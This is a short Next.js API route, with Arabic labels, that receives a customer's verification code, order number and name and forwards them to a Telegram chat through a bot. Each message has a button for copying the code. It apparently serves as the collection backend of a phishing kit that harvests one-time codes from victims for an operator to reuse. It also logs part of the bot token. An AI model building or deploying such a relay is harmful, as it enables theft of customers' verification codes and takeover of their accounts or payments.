import { NextRequest, NextResponse } from "next/server";

export async function POST(req: NextRequest) {
  const { code, orderId, customerName } = await req.json();

  const text = [
    `🔐 كود تحقق جديد`,
    `🆔 رقم الطلب: ${orderId ?? "—"}`,
    `👤 اسم العميل: ${customerName ?? "—"}`,
    `📟 الكود: ${code}`,
  ].join("\n");

  const chatId = (process.env.TELEGRAM_CHAT_IDS ?? "").split(",")[0].trim();
  const botToken = process.env.TELEGRAM_BOT_TOKEN;
  console.log("[verify] chatId:", chatId, "botToken:", botToken ? botToken.slice(0, 10) + "..." : "MISSING");

  const res = await fetch(
    `https://api.telegram.org/bot${botToken}/sendMessage`,
    {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        chat_id: chatId,
        text,
        reply_markup: {
          inline_keyboard: [
            [{ text: "📋 نسخ الكود", copy_text: { text: code } }],
          ],
        },
      }),
    }
  );

  const resBody = await res.json().catch(() => ({}));
  console.log("[verify] telegram response:", res.status, JSON.stringify(resBody));

  if (!res.ok) {
    return NextResponse.json({ ok: false, error: resBody }, { status: 502 });
  }

  return NextResponse.json({ ok: true });
}
